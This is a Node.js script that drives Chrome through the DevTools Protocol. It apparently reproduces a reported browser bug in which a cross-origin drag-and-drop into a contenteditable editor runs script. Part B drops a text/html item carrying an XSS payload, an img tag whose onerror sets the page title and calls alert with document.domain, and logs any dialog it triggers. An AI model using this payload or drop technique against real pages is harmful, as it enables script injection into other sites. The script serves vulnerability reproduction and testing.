// Part A: same-origin real-mouse drag control (default contenteditable drop insertion)
// Part B: cross-origin drop via Input.dispatchDragEvent with editor pre-focused
import { writeFileSync } from 'node:fs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const log = (m) => console.log('[LOG] ' + m);
const out = [];

class CDP {
  constructor(wsUrl) {
    this.ws = new WebSocket(wsUrl);
    this.id = 0;
    this.pending = new Map();
    this.listeners = new Map();
  }
  async open() {
    await new Promise((res, rej) => { this.ws.onopen = res; this.ws.onerror = rej; });
    this.ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data);
      if (msg.id && this.pending.has(msg.id)) {
        const { res, rej } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        msg.error ? rej(new Error(JSON.stringify(msg.error))) : res(msg.result);
      } else if (msg.method) {
        for (const fn of this.listeners.get(msg.method) || []) fn(msg.params);
      }
    };
  }
  send(method, params = {}) {
    const id = ++this.id;
    return new Promise((res, rej) => {
      this.pending.set(id, { res, rej });
      this.ws.send(JSON.stringify({ id, method, params }));
    });
  }
  on(method, fn) {
    if (!this.listeners.has(method)) this.listeners.set(method, []);
    this.listeners.get(method).push(fn);
  }
}

async function main() {
  const base = 'http://127.0.0.1:9222';
  let list = await (await fetch(base + '/json/list')).json();
  const dropTab = list.find((t) => t.type === 'page' && t.url.includes(':8001'));
  await fetch(base + '/json/new?' + encodeURIComponent('http://127.0.0.1:8001/testdrop_sameorigin.html'), { method: 'PUT' });
  await sleep(2500);
  list = await (await fetch(base + '/json/list')).json();
  const ctrlTab = list.find((t) => t.type === 'page' && t.url.includes('testdrop_sameorigin'));
  log('control tab: ' + ctrlTab.url);

  // ---------- Part A: same-origin real mouse drag ----------
  const ctrl = new CDP(ctrlTab.webSocketDebuggerUrl);
  await ctrl.open();
  const consoleA = [];
  ctrl.on('Runtime.consoleAPICalled', (p) => {
    const text = (p.args || []).map((a) => a.value ?? a.description ?? '').join(' ');
    consoleA.push(text);
    log('A-console[' + p.type + ']: ' + text);
  });
  const dialogsA = [];
  ctrl.on('Page.javascriptDialogOpening', (p) => { dialogsA.push(p); log('A-DIALOG: ' + p.message); });
  await ctrl.send('Page.enable');
  await ctrl.send('Runtime.enable');
  await ctrl.send('Page.bringToFront');
  await sleep(1200);
  const evalA = async (expr) => {
    const r = await ctrl.send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true });
    return r.result && r.result.value;
  };
  const dragRect = JSON.parse(await evalA(`JSON.stringify(document.getElementById('drag').getBoundingClientRect())`));
  const targetRect = JSON.parse(await evalA(`JSON.stringify(document.getElementById('target').getBoundingClientRect())`));
  const sx = dragRect.left + dragRect.width / 2, sy = dragRect.top + dragRect.height / 2;
  const tx = targetRect.left + targetRect.width / 2, ty = targetRect.top + targetRect.height / 2;
  log(`A points: (${sx},${sy}) -> (${tx},${ty})`);
  await ctrl.send('Input.dispatchMouseEvent', { type: 'mousePressed', x: sx, y: sy, button: 'left', buttons: 1, clickCount: 1 });
  await sleep(250);
  await ctrl.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: sx + 12, y: sy + 3, button: 'left', buttons: 1 });
  await sleep(250);
  await ctrl.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: sx + 25, y: sy + 5, button: 'left', buttons: 1 });
  await sleep(250);
  const steps = 14;
  for (let i = 1; i <= steps; i++) {
    await ctrl.send('Input.dispatchMouseEvent', {
      type: 'mouseMoved',
      x: sx + 25 + ((tx - sx - 25) * i) / steps,
      y: sy + 5 + ((ty - sy - 5) * i) / steps,
      button: 'left', buttons: 1
    });
    await sleep(120);
  }
  await sleep(300);
  await ctrl.send('Input.dispatchMouseEvent', { type: 'mouseReleased', x: tx, y: ty, button: 'left', buttons: 0, clickCount: 1 });
  await sleep(1500);
  const htmlA = await evalA(`document.getElementById('target').innerHTML`);
  const titleA = await evalA('document.title');
  log('A innerHTML: ' + htmlA);
  log('A title: ' + titleA);
  if (dialogsA.length) {
    try {
      const shot = await ctrl.send('Page.captureScreenshot', { format: 'png' });
      writeFileSync('D:/Codes/agents/aiic_three_stage_pipeline/artifacts/reproduction/repro/issue_368562236__a67257b4f4/control_sameorigin.png', Buffer.from(shot.data, 'base64'));
      log('A screenshot saved');
    } catch (e) { log('A screenshot failed: ' + e.message); }
    await ctrl.send('Page.handleJavaScriptDialog', { accept: true });
    await sleep(800);
  }
  out.push({ part: 'A-sameorigin', innerHTML: htmlA, title: titleA, dialogs: dialogsA.map((d) => d.message), console: consoleA });

  // ---------- Part B: cross-origin dispatchDragEvent with editor focused ----------
  const page = new CDP(dropTab.webSocketDebuggerUrl);
  await page.open();
  const consoleB = [];
  page.on('Runtime.consoleAPICalled', (p) => {
    const text = (p.args || []).map((a) => a.value ?? a.description ?? '').join(' ');
    consoleB.push(text);
    log('B-console[' + p.type + ']: ' + text);
  });
  const dialogsB = [];
  page.on('Page.javascriptDialogOpening', (p) => { dialogsB.push(p); log('B-DIALOG: ' + p.message); });
  await page.send('Page.enable');
  await page.send('Runtime.enable');
  await page.send('Page.navigate', { url: 'http://127.0.0.1:8001/dropme.html' });
  await sleep(1500);
  await page.send('Page.bringToFront');
  await sleep(800);
  const evalB = async (expr) => {
    const r = await page.send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true });
    return r.result && r.result.value;
  };
  const rect = JSON.parse(await evalB(`JSON.stringify(document.getElementById('target').getBoundingClientRect())`));
  const cx = rect.left + rect.width / 2, cy = rect.top + rect.height / 2;
  // focus the editor with a real click (places caret)
  await page.send('Input.dispatchMouseEvent', { type: 'mousePressed', x: cx, y: cy, button: 'left', buttons: 1, clickCount: 1 });
  await page.send('Input.dispatchMouseEvent', { type: 'mouseReleased', x: cx, y: cy, button: 'left', buttons: 0, clickCount: 1 });
  await sleep(500);
  const activeEl = await evalB(`document.activeElement ? document.activeElement.id : 'none'`);
  log('B activeElement after click: ' + activeEl);
  const payload = '<img src="x" onerror="document.title=\'XSS-EXECUTED:\'+document.domain; alert(\'XSS:\'+document.domain)">';
  const dragData = {
    items: [
      { mimeType: 'text/plain', data: 'hello-from-8000' },
      { mimeType: 'text/html', data: payload }
    ],
    dragOperationsMask: 3,
    files: []
  };
  await page.send('Input.dispatchDragEvent', { type: 'dragEnter', x: cx, y: cy, data: dragData });
  await sleep(300);
  await page.send('Input.dispatchDragEvent', { type: 'dragOver', x: cx, y: cy, data: dragData });
  await sleep(300);
  await page.send('Input.dispatchDragEvent', { type: 'drop', x: cx, y: cy, data: dragData });
  await sleep(1500);
  const htmlB = await evalB(`document.getElementById('target').innerHTML`);
  const titleB = await evalB('document.title');
  log('B innerHTML: ' + htmlB);
  log('B title: ' + titleB);
  if (dialogsB.length) {
    try {
      const shot = await page.send('Page.captureScreenshot', { format: 'png' });
      writeFileSync('D:/Codes/agents/aiic_three_stage_pipeline/artifacts/reproduction/repro/issue_368562236__a67257b4f4/drop_xss.png', Buffer.from(shot.data, 'base64'));
      log('B screenshot saved');
    } catch (e) { log('B screenshot failed: ' + e.message); }
    await page.send('Page.handleJavaScriptDialog', { accept: true });
    await sleep(800);
  }
  out.push({ part: 'B-crossorigin', activeElement: activeEl, innerHTML: htmlB, title: titleB, dialogs: dialogsB.map((d) => d.message), console: consoleB });

  writeFileSync('D:/Codes/agents/aiic_three_stage_pipeline/artifacts/reproduction/repro/issue_368562236__a67257b4f4/driver_out2.json', JSON.stringify(out, null, 2));
  log('DONE');
  process.exit(0);
}

main().catch((e) => { console.error('[FATAL] ' + e.stack); process.exit(1); });
